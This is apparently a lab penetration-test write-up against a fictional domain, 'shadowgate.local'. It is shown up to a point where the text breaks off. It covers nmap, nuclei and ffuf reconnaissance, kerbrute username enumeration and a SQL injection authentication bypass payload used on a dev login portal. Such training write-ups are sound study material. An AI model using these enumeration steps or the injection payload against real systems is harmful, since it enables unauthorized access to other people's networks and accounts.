# Objective and scope

ShadowGate provides cybersecurity solutions for global enterprises. They are in the process of getting SOC 2 certified, and have hired Hack Smarter to perform an internal network penetration test. Find all vulnerabilities and, if possible, elevate your privileges to Domain Admin.

You have been provided with VPN access to their network, but no other information.

# Host file setup

```python
sudo nxc smb 10.1.232.232 --generate-hosts-file /etc/hosts                                    
[sudo] password for kali: 
SMB         10.1.232.232    445    SG-DC01          [*] Windows 10 / Server 2019 Build 17763 x64 (name:SG-DC01) (domain:shadowgate.local) (signing:True) (SMBv1:None) (Null Auth:True)
```

# Enumeration

## Open ports
```python
nmap -p- --min-rate=1000 -sT sg-dc01.shadowgate.local
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-31 17:09 +0100
Stats: 0:02:06 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 97.77% done; ETC: 17:12 (0:00:03 remaining)
Nmap scan report for sg-dc01.shadowgate.local (10.1.232.232)
Host is up (0.095s latency).
rDNS record for 10.1.232.232: SG-DC01.shadowgate.local
Not shown: 65521 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
593/tcp   open  http-rpc-epmap
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3389/tcp  open  ms-wbt-server
9389/tcp  open  adws
49665/tcp open  unknown
49669/tcp open  unknown
49694/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 129.76 seconds
```

Also port 389 and 5985 are open and nmap missed them!

## Nmap
```python
nmap -p 53,80,88,135,139,389,445,593,1433,3268,3389,5985,9389 -A --min-rate=1000 -sT sg-dc01.shadowgate.local
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-31 17:13 +0100
Nmap scan report for sg-dc01.shadowgate.local (10.1.232.232)
Host is up (0.095s latency).
rDNS record for 10.1.232.232: SG-DC01.shadowgate.local

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: ShadowGate | Advanced Cyber Security Solutions
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-31 16:14:04Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadowgate.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-31T16:14:57+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SG-DC01.shadowgate.local
| Not valid before: 2025-12-07T17:46:45
|_Not valid after:  2026-12-07T17:46:45
445/tcp  open  microsoft-ds?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   10.1.232.232:1433: 
|     Target_Name: SHADOWGATE
|     NetBIOS_Domain_Name: SHADOWGATE
|     NetBIOS_Computer_Name: SG-DC01
|     DNS_Domain_Name: shadowgate.local
|     DNS_Computer_Name: SG-DC01.shadowgate.local
|     DNS_Tree_Name: shadowgate.local
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.1.232.232:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-07-31T16:06:53
|_Not valid after:  2056-07-31T16:06:53
|_ssl-date: 2026-07-31T16:14:57+00:00; -1s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: shadowgate.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-31T16:14:57+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:SG-DC01.shadowgate.local
| Not valid before: 2025-12-07T17:46:45
|_Not valid after:  2026-12-07T17:46:45
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SHADOWGATE
|   NetBIOS_Domain_Name: SHADOWGATE
|   NetBIOS_Computer_Name: SG-DC01
|   DNS_Domain_Name: shadowgate.local
|   DNS_Computer_Name: SG-DC01.shadowgate.local
|   DNS_Tree_Name: shadowgate.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-31T16:14:18+00:00
| ssl-cert: Subject: commonName=SG-DC01.shadowgate.local
| Not valid before: 2026-07-18T09:38:28
|_Not valid after:  2027-01-17T09:38:28
|_ssl-date: 2026-07-31T16:14:57+00:00; -1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Microsoft Windows Server 2019 (92%), Microsoft Windows 10 1903 - 22H2 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: Host: SG-DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)
Null auth is enabled like most DCs, but not able to use it to access shares or dump users

The guest account is also disabled!

# HTTP (80)

![1111](Pasted%20image%2020260731171951.png)

![933](Pasted%20image%2020260731172234.png)

![919](Pasted%20image%2020260731172254.png)

Found a contact page, but doesnt use HTTP, instead it uses javascript so i cant really abuse it

Found some potential users

```python
mitch ressek
bogdan radzik
milo weis
oscar mazerath
sam hadges
daniel ramus
ryan james
```

Also worth noting the apply button for sam hedges is a javascript function that mails an account `careers@shadowgate.local`

## Nuclei
```python
[exposed-pki-cert] [http] [high] http://shadowgate.local// [paths="/"]
[iis-shortname-detect] [http] [info] http://shadowgate.local/*~1*/a.aspx
[iis-shortname-detect] [http] [info] http://shadowgate.local/badb8rtb*~1*/a.aspx
[iis-shortname-detect] [http] [info] http://shadowgate.local/*~1*/a.aspx
[waf-detect:aspgeneric] [http] [info] http://shadowgate.local/
[waf-detect:modsecurity] [http] [info] http://shadowgate.local/
[mssql-detect] [javascript] [info] shadowgate.local:1433
[rdp-detect] [javascript] [info] shadowgate.local:3389
[ldap-metadata] [javascript] [info] shadowgate.local:389 ["DnsHostName: SG-DC01.shadowgate.local","DefaultNamingContext: DC=shadowgate,DC=local","DomainFunctionality: 7","ForestFunctionality: 7","DomainControllerFunctionality: 7","BaseDN: dc=389"]
[smb-version-detect:smb-version] [javascript] [info] shadowgate.local:445 ["SMB 2.1"]
[smb2-server-time] [javascript] [info] shadowgate.local:445 ["SystemTime: 2026-07-31T16:24:19.000Z ServerStartTime: 2009-04-22T19:24:48.000Z"]
[smb2-capabilities] [javascript] [info] shadowgate.local:445 ["["DFSSupport","LargeMTU","Leasing"]"]
[smb-enum-domains] [javascript] [info] shadowgate.local:445 ["DomainName: shadowgate.local"]
[smb-enum] [javascript] [info] shadowgate.local:445 ["OSVersion: 10.0.17763","NetBIOSComputerName: SG-DC01","NetBIOSDomainName: SHADOWGATE","DNSComputerNamen: SG-DC01.shadowgate.local","DNSComputerName: SG-DC01.shadowgate.local","ForestName: shadowgate.local"]
[smb-os-detect] [javascript] [info] shadowgate.local:445 ["Windows Server 2019, Version 1809"]
[ldap-anonymous-login-detect] [javascript] [medium] shadowgate.local
[rdp-detection:win2016] [tcp] [info] shadowgate.local:3389
[tech-detect:font-awesome] [http] [info] http://shadowgate.local/
[tech-detect:ms-iis] [http] [info] http://shadowgate.local/
[options-method] [http] [info] http://shadowgate.local/ ["OPTIONS, TRACE, GET, HEAD, POST"]
[addeventlistener-detect] [http] [info] http://shadowgate.local/
[email-extractor] [http] [info] http://shadowgate.local/ ["security@shadowgate.com","careers@shadowgate.com"]
[old-copyright] [http] [info] http://shadowgate.local/ ["\u00a9 2025"]
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://shadowgate.local/
[http-missing-security-headers:x-frame-options] [http] [info] http://shadowgate.local/
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://shadowgate.local/
[http-missing-security-headers:referrer-policy] [http] [info] http://shadowgate.local/
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://shadowgate.local/
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://shadowgate.local/
[http-missing-security-headers:strict-transport-security] [http] [info] http://shadowgate.local/
[http-missing-security-headers:content-security-policy] [http] [info] http://shadowgate.local/
[http-missing-security-headers:permissions-policy] [http] [info] http://shadowgate.local/
[http-missing-security-headers:x-content-type-options] [http] [info] http://shadowgate.local/
[missing-sri] [http] [info] http://shadowgate.local/ ["https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"]
[microsoft-iis-version] [http] [info] http://shadowgate.local/ ["Microsoft-IIS/10.0"]
[aspnet-version-detect] [http] [info] http://shadowgate.local/%3f ["4.0.30319"]
[form-detection] [http] [info] http://shadowgate.local/
```

## Ffuf for subdomains
```python
ffuf -u http://shadowgate.local/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.shadowgate.local' -ic -c -t 40 -fs 63405

dev                     [Status: 200, Size: 14924, Words: 4761, Lines: 425, Duration: 114ms]
```

Found a subdomain `dev`

Also no hidden endpoints on the main site

# `dev` suubdomain

![912](Pasted%20image%2020260731173753.png)

Found a user `mitch.r` in the bottom right, gives me a username format

Also tells me this allows a file upload and they go to the `dev$` share

Not yet sure if the login portal takes domain credentials!

Foerxbuster only found `/upload` which returns a IIS 403

Nuclei did not detect anything on the subdomain

# User enumeration

So i found some team members before ill put them into a file calles `names.txt` 

```python
./username-anarchy -i ../names.txt
```

Then ill run username anarchy to generate some different combinations, even though im pretty sure itll be first.last initial like i saw with `mitch.r` 

```python
kerbrute userenum --dc sg-dc01.shadowgate.local -d shadowgate.local ../potential-users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/31/26 - Ronnie Flathers @ropnop

2026/07/31 17:47:02 >  Using KDC(s):
2026/07/31 17:47:02 >  	sg-dc01.shadowgate.local:88

2026/07/31 17:47:02 >  [+] VALID USERNAME:	mitch.r@shadowgate.local
2026/07/31 17:47:03 >  [+] VALID USERNAME:	bogdan.r@shadowgate.local
2026/07/31 17:47:03 >  [+] VALID USERNAME:	milo.w@shadowgate.local
2026/07/31 17:47:03 >  [+] VALID USERNAME:	oscar.m@shadowgate.local
2026/07/31 17:47:03 >  [+] VALID USERNAME:	daniel.r@shadowgate.local
2026/07/31 17:47:03 >  [+] VALID USERNAME:	ryan.j@shadowgate.local
2026/07/31 17:47:03 >  Done! Tested 109 usernames (6 valid) in 1.074 seconds
```

Found 6 valid users, no sam but it does say on the page he has left so he may be deleted, that could come in later to restore the user!

Using this list i can try some AS-REP roasting

AS-REP roasting not possible

# SQLi auth bpyass
So after entering a single quote in the username i get a 500 server error, this is usually a dead giveaway its some form of SQL injection

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass

```python
' OR '1'='1'--
```

The use of the above payload in the username field with anything in the password field allows me to authenticate as `mitch.r`

![778](Pasted%20image%2020260731182802.png)

Looks like all files uploaded upload to the path `C:\dev\`

And also in the dev$ share

It also says it allows any kind of 